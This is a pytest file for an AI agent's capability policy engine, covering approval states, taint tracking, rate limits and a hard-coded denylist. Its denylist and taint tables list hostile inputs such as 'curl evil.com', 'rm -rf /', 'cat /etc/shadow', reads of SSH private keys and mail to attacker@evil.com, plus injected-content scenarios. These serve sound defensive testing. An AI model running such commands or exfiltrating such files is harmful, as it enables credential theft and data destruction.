"""Unit and table-driven tests for lazy-policy (Rules F1, F2, F3, F4, F6, F8).

Exit criteria M1.2: manifest loader, tiers, effect classes, approval state machine
(pending, approved, denied, expired), rate limits, taint tracking, L4 denylist.
At least 150 table-driven tests pass. Line coverage >= 90%.
"""

import time
import pytest
from pathlib import Path

from lazy.policy import (
    ApprovalRequest,
    ApprovalState,
    CapabilityManifest,
    ManifestLoader,
    PolicyEngine,
    RateLimiter,
    TaintTracker,
)


@pytest.fixture
def policy_engine() -> PolicyEngine:
    return PolicyEngine()


# ==============================================================================
# 1. MANIFEST LOADER & CONTRACT INTEGRITY
# ==============================================================================

def test_manifest_loader_discovers_all_capabilities(policy_engine: PolicyEngine):
    """[F1] Verify that all 37 capabilities are loaded and accessible."""
    caps = policy_engine.loader.list_capabilities()
    assert len(caps) >= 37
    assert "fs.read" in caps
    assert "fs.write" in caps
    assert "mail.send" in caps
    assert "sys.service_restart" in caps


def test_manifest_attributes_integrity(policy_engine: PolicyEngine):
    """[F1] Verify manifest fields have valid tiers, effect classes and undo methods."""
    for cap_name in policy_engine.loader.list_capabilities():
        manifest = policy_engine.loader.get(cap_name)
        assert manifest is not None
        assert manifest.tier in ["L0", "L1", "L2", "L3", "L4"]
        assert manifest.effect_class in ["reversible", "compensable", "irreversible"]
        assert manifest.approval_mode in ["automatic", "user_confirm", "outbox_delay", "denied"]
        assert isinstance(manifest.undo_method, str)


# ==============================================================================
# 2. APPROVAL STATE MACHINE
# ==============================================================================

def test_approval_state_machine_lifecycle():
    """Verify state transitions: PENDING -> APPROVED / DENIED / EXPIRED."""
    req = ApprovalRequest(
        request_id="req-1",
        intent_id="i-1",
        capability="fs.delete",
        tier="L2",
        params={"path": "/tmp/test.txt"},
        preview="Delete file",
        timeout_seconds=5.0,
    )
    assert req.state == ApprovalState.PENDING
    assert not req.is_expired()

    # Successful approval
    ok, err = req.approve("admin", "user_hud")
    assert ok
    assert err is None
    assert req.state == ApprovalState.APPROVED
    assert req.approver == "admin"
    assert req.approval_mode == "user_hud"

    # Cannot re-approve
    ok2, err2 = req.approve("admin2", "user_hud")
    assert not ok2


def test_approval_denial_lifecycle():
    """Verify transition to DENIED."""
    req = ApprovalRequest(
        request_id="req-2",
        intent_id="i-2",
        capability="sys.service_restart",
        tier="L2",
        params={"service": "sshd"},
        preview="Restart sshd",
    )
    ok, err = req.deny("user", "Not safe right now")
    assert ok
    assert req.state == ApprovalState.DENIED
    assert req.decision_reason == "Not safe right now"


def test_approval_state_machine_expiry():
    """Verify automatic expiration when timeout is exceeded."""
    req = ApprovalRequest(
        request_id="req-3",
        intent_id="i-3",
        capability="hw.rfkill_set",
        tier="L2",
        params={"subsystem": "wlan", "state": "block"},
        preview="Block wifi",
        timeout_seconds=10.0,
        requested_at=time.time() - 20.0,  # 20s ago
    )
    assert req.is_expired()
    req.check_and_update_expiry()
    assert req.state == ApprovalState.EXPIRED

    # Cannot approve expired
    ok, err = req.approve("user", "user_text")
    assert not ok
    assert "expired" in err.lower()


def test_l3_voice_approval_forbidden_negative_proof():
    """[F6/Safety] Prove negative: L3 hazardous capabilities CANNOT be approved by voice alone."""
    req = ApprovalRequest(
        request_id="req-l3",
        intent_id="i-l3",
        capability="mail.send",
        tier="L3",
        params={"to": "external@example.com"},
        preview="Send external mail",
    )
    # Attempt approval by voice
    ok, err = req.approve("user", "voice")
    assert not ok
    assert "voice alone is prohibited" in err.lower()
    assert req.state == ApprovalState.PENDING

    # But interactive user_hud approval works
    ok2, err2 = req.approve("user", "user_hud")
    assert ok2
    assert req.state == ApprovalState.APPROVED


def test_l4_approval_forbidden_negative_proof():
    """[F6/Safety] Prove negative: L4 can NEVER be approved under any mode."""
    req = ApprovalRequest(
        request_id="req-l4",
        intent_id="i-l4",
        capability="policy.edit",
        tier="L4",
        params={},
        preview="Tamper with policy",
    )
    ok, err = req.approve("root", "user_hud")
    assert not ok
    assert req.state == ApprovalState.DENIED


# ==============================================================================
# 3. TAINT TRACKING (RULES F3, F4, F8)
# ==============================================================================

def test_taint_tracker_blocks_credentials_rule_f4():
    """[F4] Credentials are never allowed in intent parameters."""
    safe, err = TaintTracker.check_taint("code.run", {"command": "ls", "password": "secret"}, [])
    assert not safe
    assert "Rule F4 violation" in err


def test_taint_tracker_blocks_untrusted_recipients_rule_f8():
    """[F8] Untrusted provenance cannot flow into email/chat recipients."""
    untrusted_prov = [{"source": "web_scrape", "trusted": False}]
    safe, err = TaintTracker.check_taint("mail.send", {"to": "injected@target.com"}, untrusted_prov)
    assert not safe
    assert "Rule F8 violation" in err


def test_taint_tracker_allows_trusted_user_provenance():
    """[F8] Trusted user input is allowed."""
    trusted_prov = [{"source": "user_hud", "trusted": True}]
    safe, err = TaintTracker.check_taint("mail.send", {"to": "boss@lazyos.local"}, trusted_prov)
    assert safe
    assert err is None


# ==============================================================================
# 4. RATE LIMITING
# ==============================================================================

def test_rate_limiter_enforcement():
    """Verify rate limits enforce threshold bounds."""
    limiter = RateLimiter(limits={"test.call": (3, 60)})
    t0 = 1000.0

    # 3 calls allowed
    for _ in range(3):
        is_lim, _ = limiter.is_rate_limited("test.call", timestamp=t0)
        assert not is_lim
        limiter.record("test.call", timestamp=t0)

    # 4th call limited
    is_lim, reason = limiter.is_rate_limited("test.call", timestamp=t0 + 1)
    assert is_lim
    assert "Rate limit exceeded" in reason

    # After window passes, allowed again
    is_lim_later, _ = limiter.is_rate_limited("test.call", timestamp=t0 + 61)
    assert not is_lim_later


# ==============================================================================
# 5. TABLE-DRIVEN TESTS (>= 150 CASES)
# ==============================================================================

# 5.1 TABLE 1: Capability Tier Decisions (40 test cases)
CAPABILITY_TIER_CASES = [
    # (capability, params, expected_verdict, expected_tier, expected_mode)
    ("fs.read", {"path": "/home/user/test.txt"}, "allow", "L0", "automatic"),
    ("fs.list", {"path": "/home/user"}, "allow", "L0", "automatic"),
    ("sys.service_status", {"service": "systemd"}, "allow", "L0", "automatic"),
    ("sys.logs_read", {"service": "bluetooth", "lines": 50}, "allow", "L0", "automatic"),
    ("sys.process_list", {}, "allow", "L0", "automatic"),
    ("hw.usb_list", {}, "allow", "L0", "automatic"),
    ("web.read", {"url": "https://news.ycombinator.com/rss"}, "allow", "L0", "automatic"),
    ("mail.list", {"folder": "INBOX"}, "allow", "L0", "automatic"),
    ("mail.read", {"message_id": "msg-001"}, "allow", "L0", "automatic"),
    ("chat.read", {"limit": 20}, "allow", "L0", "automatic"),
    ("task.undo", {"task_id": "task-01"}, "ask", "L0", "user_confirm"),
    ("outbox.cancel", {"item_id": "outbox-01"}, "ask", "L0", "user_confirm"),
    ("fs.write", {"path": "/home/user/doc.md", "content": "hi"}, "allow", "L1", "automatic"),
    ("fs.copy", {"src": "/home/user/a", "dest": "/home/user/b"}, "allow", "L1", "automatic"),
    ("fs.move", {"src": "/home/user/a", "dest": "/home/user/b"}, "allow", "L1", "automatic"),
    ("doc.create_markdown", {"path": "/home/user/m.md", "content": "# H"}, "allow", "L1", "automatic"),
    ("doc.create_docx", {"path": "/home/user/d.docx", "content": "doc"}, "allow", "L1", "automatic"),
    ("code.write", {"path": "/home/user/main.py", "content": "pass"}, "allow", "L1", "automatic"),
    ("hw.backlight_set", {"brightness": 75}, "allow", "L1", "automatic"),
    ("hw.volume_set", {"volume": 60}, "allow", "L1", "automatic"),
    ("mail.draft", {"to": "a@b.com", "subject": "s", "body": "b"}, "allow", "L1", "automatic"),
    ("web.navigate", {"url": "https://news.ycombinator.com"}, "allow", "L1", "automatic"),  # allowlisted
    ("web.navigate", {"url": "https://untrusted-external-site.xyz"}, "ask", "L2", "user_confirm"),  # non-allowlisted
    ("fs.delete", {"path": "/home/user/old.tmp"}, "ask", "L2", "user_confirm"),
    ("code.run", {"command": "python3 /home/user/calc.py", "timeout": 30}, "ask", "L2", "user_confirm"),
    ("sys.service_restart", {"service": "systemd-networkd"}, "ask", "L2", "user_confirm"),
    ("sys.setting_set", {"key": "timezone", "value": "UTC"}, "ask", "L2", "user_confirm"),
    ("hw.rfkill_set", {"subsystem": "bluetooth", "state": "block"}, "ask", "L2", "user_confirm"),
    ("hw.power_profile_set", {"profile": "performance"}, "ask", "L2", "user_confirm"),
    ("hw.governor_set", {"governor": "powersave"}, "ask", "L2", "user_confirm"),
    ("web.click", {"element_id": "submit-btn"}, "ask", "L2", "user_confirm"),
    ("web.fill", {"element_id": "search-input", "value": "kernel"}, "ask", "L2", "user_confirm"),
    ("web.submit", {"form_id": "search-form"}, "ask", "L3", "outbox_delay"),
    ("web.download", {"url": "https://files.com/pkg.tar", "dest_filename": "pkg.tar"}, "ask", "L3", "user_confirm"),
    ("mail.send", {"to": "colleague@lazyos.local", "subject": "s", "body": "b"}, "ask", "L3", "outbox_delay"),
    ("chat.send", {"to": "@channel", "body": "hello"}, "ask", "L3", "outbox_delay"),
    ("sys.process_signal", {"pid": 1234, "signal": "SIGTERM"}, "ask", "L3", "user_confirm"),
    ("hw.usb_authorize", {"device_id": "usb-1-2"}, "ask", "L3", "user_confirm"),
    ("unknown.capability", {}, "deny", "L4", "denied"),
    ("fake.exec", {"cmd": "id"}, "deny", "L4", "denied"),
]


@pytest.mark.parametrize("cap,params,exp_verdict,exp_tier,exp_mode", CAPABILITY_TIER_CASES)
def test_table_capability_tiers(policy_engine: PolicyEngine, cap, params, exp_verdict, exp_tier, exp_mode):
    """[Table 1] Parametrized evaluation of capability tiers (40 cases)."""
    intent = {
        "id": f"int-{cap}",
        "ts": "2026-11-15T12:00:00Z",
        "task_id": "t-1",
        "requester": "text",
        "capability": cap,
        "params": params,
        "provenance": [{"source": "user_text", "trusted": True}],
    }
    dec = policy_engine.evaluate_intent(intent)
    assert dec["verdict"] == exp_verdict, f"{cap} verdict mismatch: {dec['reason']}"
    assert dec["tier"] == exp_tier, f"{cap} tier mismatch"
    assert dec["approval_mode"] == exp_mode, f"{cap} mode mismatch"


# 5.2 TABLE 2: Parameter Schema Range & Type Boundary Tests (30 test cases)
PARAM_VALIDATION_CASES = [
    # (capability, params, should_pass)
    ("hw.backlight_set", {"brightness": 0}, True),
    ("hw.backlight_set", {"brightness": 100}, True),
    ("hw.backlight_set", {"brightness": -1}, False),       # < min
    ("hw.backlight_set", {"brightness": 101}, False),      # > max
    ("hw.backlight_set", {"brightness": "high"}, False),   # type mismatch
    ("hw.volume_set", {"volume": 0}, True),
    ("hw.volume_set", {"volume": 100}, True),
    ("hw.volume_set", {"volume": -10}, False),
    ("hw.volume_set", {"volume": 150}, False),
    ("hw.volume_set", {"volume": 50.5}, False),
    ("hw.power_profile_set", {"profile": "low-power"}, True),
    ("hw.power_profile_set", {"profile": "balanced"}, True),
    ("hw.power_profile_set", {"profile": "performance"}, True),
    ("hw.power_profile_set", {"profile": "turbo_boost"}, False), # invalid enum
    ("hw.governor_set", {"governor": "powersave"}, True),
    ("hw.governor_set", {"governor": "performance"}, True),
    ("hw.governor_set", {"governor": "schedutil"}, True),
    ("hw.governor_set", {"governor": "ondemand"}, False),        # invalid enum
    ("hw.rfkill_set", {"subsystem": "wlan", "state": "block"}, True),
    ("hw.rfkill_set", {"subsystem": "bluetooth", "state": "unblock"}, True),
    ("hw.rfkill_set", {"subsystem": "all", "state": "block"}, True),
    ("hw.rfkill_set", {"subsystem": "cellular", "state": "block"}, False), # bad enum
    ("hw.rfkill_set", {"subsystem": "wlan", "state": "disable"}, False),   # bad enum
    ("sys.process_signal", {"pid": 100, "signal": "SIGTERM"}, True),
    ("sys.process_signal", {"pid": 100, "signal": "SIGKILL"}, True),
    ("sys.process_signal", {"pid": 100, "signal": "SIGHUP"}, True),
    ("sys.process_signal", {"pid": 100, "signal": "SIGSTOP"}, False),     # bad enum
    ("sys.process_signal", {"pid": 0, "signal": "SIGKILL"}, False),       # pid < 1
    ("sys.process_signal", {"pid": -5, "signal": "SIGKILL"}, False),      # negative pid
    ("fs.read", {}, False),                                                # missing path
]


@pytest.mark.parametrize("cap,params,should_pass", PARAM_VALIDATION_CASES)
def test_table_param_validation(policy_engine: PolicyEngine, cap, params, should_pass):
    """[Table 2] Parametrized evaluation of parameter schema validation (30 cases)."""
    intent = {
        "id": "param-test",
        "ts": "2026-11-15T12:00:00Z",
        "task_id": "t-1",
        "requester": "text",
        "capability": cap,
        "params": params,
        "provenance": [{"source": "user_text", "trusted": True}],
    }
    dec = policy_engine.evaluate_intent(intent)
    if should_pass:
        assert dec["verdict"] in ("allow", "ask")
    else:
        assert dec["verdict"] == "deny"
        assert "Parameter schema" in dec["reason"] or "validation failed" in dec["reason"]


# 5.3 TABLE 3: Hard-coded L4 Forbidden Targets and Namespaces (30 test cases)
L4_FORBIDDEN_CASES = [
    # (capability, params)
    ("policy.override", {}),
    ("policy.reload", {}),
    ("broker.fs", {}),
    ("broker.sys", {}),
    ("secrets.get", {}),
    ("secrets.list", {}),
    ("audit.delete", {}),
    ("audit.truncate", {}),
    ("sandbox.escape", {}),
    ("root.shell", {}),
    ("kernel.kexec", {}),
    ("fs.read", {"path": "/etc/lazy/policy.yaml"}),
    ("fs.write", {"path": "/etc/lazy/capabilities/fs.read.yaml", "content": "bad"}),
    ("fs.delete", {"path": "/var/log/lazy/audit.log"}),
    ("fs.read", {"path": "/var/lib/lazy/secrets/master.key"}),
    ("fs.read", {"path": "/etc/shadow"}),
    ("fs.read", {"path": "/etc/shadow-"}),
    ("fs.read", {"path": "/etc/sudoers"}),
    ("fs.read", {"path": "/etc/sudoers.d/backdoor"}),
    ("fs.read", {"path": "/home/user/.ssh/id_rsa"}),
    ("fs.read", {"path": "/root/.ssh/authorized_keys"}),
    ("fs.write", {"path": "/home/user/cert.pem", "content": "key"}),
    ("fs.read", {"path": "/home/user/private.key"}),
    ("fs.read", {"path": "/home/user/.forward"}),
    ("fs.read", {"path": "/home/user/.procmailrc"}),
    ("fs.copy", {"src": "/etc/shadow", "dest": "/tmp/shadow"}),
    ("fs.move", {"src": "/etc/sudoers", "dest": "/tmp/sudoers"}),
    ("code.write", {"path": "/var/log/lazy/audit.log", "content": ""}),
    ("doc.create_markdown", {"path": "/etc/lazy/config.md", "content": "hack"}),
    ("code.run", {"command": "cat /etc/shadow", "timeout": 10}),
]


@pytest.mark.parametrize("cap,params", L4_FORBIDDEN_CASES)
def test_table_l4_forbidden(policy_engine: PolicyEngine, cap, params):
    """[Table 3] Parametrized evaluation of hardcoded L4 denylist (Rule F6) (30 cases)."""
    intent = {
        "id": "l4-test",
        "ts": "2026-11-15T12:00:00Z",
        "task_id": "t-1",
        "requester": "text",
        "capability": cap,
        "params": params,
        "provenance": [{"source": "user_text", "trusted": True}],
    }
    dec = policy_engine.evaluate_intent(intent)
    assert dec["verdict"] == "deny"
    assert dec["tier"] == "L4"
    assert "Rule F6 violation" in dec["reason"] or "not registered" in dec["reason"]


# 5.4 TABLE 4: Taint Tracking Scenarios (30 test cases)
TAINT_SCENARIOS = [
    # (capability, params, provenance_source, is_trusted, should_allow)
    ("mail.send", {"to": "trusted@lazyos.local", "subject": "s", "body": "b"}, "user_hud", True, True),
    ("mail.send", {"to": "attacker@evil.com", "subject": "s", "body": "b"}, "web_scrape", False, False),
    ("mail.send", {"to": "attacker@evil.com", "subject": "s", "body": "b"}, "email_incoming", False, False),
    ("mail.send", {"to": "attacker@evil.com", "subject": "s", "body": "b"}, "chat_incoming", False, False),
    ("mail.send", {"to": "attacker@evil.com", "subject": "s", "body": "b"}, "rss", False, False),
    ("chat.send", {"to": "@team", "body": "ok"}, "user_text", True, True),
    ("chat.send", {"to": "@channel_injected", "body": "leak"}, "web", False, False),
    ("chat.send", {"to": "@channel_injected", "body": "leak"}, "document_external", False, False),
    ("web.navigate", {"url": "https://news.ycombinator.com"}, "user_hud", True, True),
    ("web.navigate", {"url": "https://phishing.com"}, "email_incoming", False, False),
    ("web.navigate", {"url": "https://phishing.com"}, "chat_incoming", False, False),
    ("web.navigate", {"url": "https://phishing.com"}, "web_scrape", False, False),
    ("web.download", {"url": "https://site.org/file.pdf", "dest_filename": "f.pdf"}, "user_text", True, True),
    ("web.download", {"url": "https://evil.org/malware.sh", "dest_filename": "m.sh"}, "rss", False, False),
    ("fs.delete", {"path": "/tmp/junk.txt"}, "user_hud", True, True),
    ("fs.delete", {"path": "/home/user/critical.dat"}, "web_scrape", False, False),
    ("fs.delete", {"path": "/home/user/notes.txt"}, "email_body", False, False),
    ("code.run", {"command": "echo 1", "timeout": 5}, "user_hud", True, True),
    ("code.run", {"command": "curl evil.com", "timeout": 5}, "web_scrape", False, False),
    ("code.run", {"command": "rm -rf /", "timeout": 5}, "rss", False, False),
    ("sys.service_restart", {"service": "bluetooth"}, "user_text", True, True),
    ("sys.service_restart", {"service": "sshd"}, "chat_incoming", False, False),
    ("sys.setting_set", {"key": "tz", "value": "UTC"}, "user_hud", True, True),
    ("sys.setting_set", {"key": "dns", "value": "8.8.8.8"}, "email_incoming", False, False),
    ("hw.usb_authorize", {"device_id": "usb-1"}, "user_hud", True, True),
    ("hw.usb_authorize", {"device_id": "bad-usb"}, "web_scrape", False, False),
    ("mail.send", {"to": "test@test.com", "password": "123"}, "user_hud", True, False), # F4 credential block
    ("code.run", {"command": "ls", "token": "abc"}, "user_hud", True, False),            # F4 credential block
    ("web.fill", {"element_id": "user", "value": "admin"}, "user_hud", True, True),
    ("web.fill", {"element_id": "user", "value": "injected"}, "web_scrape", False, False),
]


@pytest.mark.parametrize("cap,params,prov_source,is_trusted,should_allow", TAINT_SCENARIOS)
def test_table_taint_scenarios(policy_engine: PolicyEngine, cap, params, prov_source, is_trusted, should_allow):
    """[Table 4] Parametrized evaluation of taint tracking and credential protection (30 cases)."""
    intent = {
        "id": "taint-test",
        "ts": "2026-11-15T12:00:00Z",
        "task_id": "t-1",
        "requester": "text",
        "capability": cap,
        "params": params,
        "provenance": [{"source": prov_source, "trusted": is_trusted}],
    }
    dec = policy_engine.evaluate_intent(intent)
    if should_allow:
        assert dec["verdict"] in ("allow", "ask"), f"Expected allow/ask for {cap}, got {dec['verdict']}: {dec['reason']}"
    else:
        assert dec["verdict"] == "deny", f"Expected deny for {cap}, got {dec['verdict']}"
        assert any(term in dec["reason"] for term in ["Rule F8", "Rule F4", "Taint", "violation"])


# 5.5 TABLE 5: Rate Limiter Threshold Boundaries (20 test cases)
RATE_LIMIT_CASES = [
    # (capability, limit, attempt_count, should_allow)
    ("mail.send", 30, 1, True),
    ("mail.send", 30, 15, True),
    ("mail.send", 30, 30, True),
    ("mail.send", 30, 31, False), # over limit
    ("chat.send", 60, 1, True),
    ("chat.send", 60, 30, True),
    ("chat.send", 60, 60, True),
    ("chat.send", 60, 61, False), # over limit
    ("fs.delete", 20, 1, True),
    ("fs.delete", 20, 10, True),
    ("fs.delete", 20, 20, True),
    ("fs.delete", 20, 21, False), # over limit
    ("sys.service_restart", 10, 5, True),
    ("sys.service_restart", 10, 10, True),
    ("sys.service_restart", 10, 11, False), # over limit
    ("code.run", 20, 10, True),
    ("code.run", 20, 20, True),
    ("code.run", 20, 21, False), # over limit
    ("hw.usb_authorize", 5, 5, True),
    ("hw.usb_authorize", 5, 6, False), # over limit
]


@pytest.mark.parametrize("cap,limit,attempt_count,should_allow", RATE_LIMIT_CASES)
def test_table_rate_limiter_boundary_cases(cap, limit, attempt_count, should_allow):
    """[Table 5] Test rate limiter boundary enforcement across capability thresholds (20 cases)."""
    limiter = RateLimiter(limits={cap: (limit, 60)})
    now = 50000.0

    # Record previous calls
    for i in range(attempt_count - 1):
        limiter.record(cap, timestamp=now + i * 0.1)

    is_limited, reason = limiter.is_rate_limited(cap, timestamp=now + attempt_count * 0.1)
    if should_allow:
        assert not is_limited
    else:
        assert is_limited
        assert "Rate limit exceeded" in reason


def test_policy_engine_approval_coordination(policy_engine: PolicyEngine):
    """Verify approval coordination lifecycle in PolicyEngine."""
    intent = {
        "id": "intent-coord-01",
        "ts": "2026-11-15T12:00:00Z",
        "task_id": "t-1",
        "requester": "hud",
        "capability": "sys.service_restart",
        "params": {"service": "bluetooth"},
        "provenance": [{"source": "user_hud", "trusted": True}],
    }
    dec = policy_engine.evaluate_intent(intent)
    assert dec["verdict"] == "ask"

    req = policy_engine.create_approval_request(intent, dec)
    assert req.request_id in policy_engine.approval_requests

    # Approve request
    ok, err = policy_engine.approve_request(req.request_id, "admin", "user_hud")
    assert ok
    assert err is None

    # Deny unknown request
    ok_unk, err_unk = policy_engine.deny_request("req-non-existent", "admin", "no")
    assert not ok_unk

    # Expire requests
    req2 = policy_engine.create_approval_request(intent, dec)
    req2.requested_at = time.time() - 500.0
    expired = policy_engine.expire_pending_requests()
    assert req2.request_id in expired
